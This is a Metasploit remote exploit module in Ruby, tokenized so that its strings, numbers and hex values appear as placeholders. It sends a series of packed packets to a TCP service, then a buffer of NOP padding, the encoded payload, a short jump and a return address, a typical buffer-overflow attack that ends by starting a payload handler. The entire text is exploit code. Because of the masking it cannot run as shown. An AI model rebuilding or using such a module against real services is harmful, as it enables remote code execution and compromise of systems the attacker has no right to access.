require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GreatRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , ] , <str> = > true , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def exploit connect uno = [ <hex> ] . pack ( <str> ) sock . put ( uno ) dos = rand_text_alpha_upper ( <int> ) + <str> + rand_text_alpha_upper ( <int> ) + <str> sock . put ( dos ) tres = [ <hex> ] . pack ( <str> ) sock . put ( tres ) quatro = [ <hex> ] . pack ( <str> ) sock . put ( quatro ) cinco = [ <hex> ] . pack ( <str> ) sock . put ( cinco ) data = make_nops ( <int> - payload . encoded . length ) + payload . encoded data << make_nops ( <int> ) + Rex :: Arch :: X86 . jmp_short ( <int> ) + [ target . ret ] . pack ( <str> ) data << make_nops ( <int> ) + [ <hex> , - <int> ] . pack ( <str> ) + rand_text_alpha_upper ( <int> ) + <str> print_status ( <str> target . name <str> ) sock . put ( data ) handler disconnect end end 
